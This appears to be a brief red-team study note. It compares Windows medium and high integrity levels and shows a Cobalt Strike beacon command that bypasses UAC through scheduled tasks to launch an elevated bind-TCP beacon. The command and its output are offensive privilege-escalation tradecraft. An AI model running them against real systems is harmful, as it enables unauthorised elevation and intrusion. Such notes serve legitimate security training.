Restricted:
```
C:\Users\bfarmer>whoami /groups

Mandatory Label\Medium Mandatory Level
```
Not Restricted:
```
C:\Windows\system32>whoami /groups

Mandatory Label\High Mandatory Level
```

elevate Cobalt Strike
```
beacon> elevate uac-schtasks tcp-local
[*] Tasked Beacon to run windows/beacon_bind_tcp (127.0.0.1:4444) in a high integrity context
[+] established link to child beacon: 10.10.123.102
```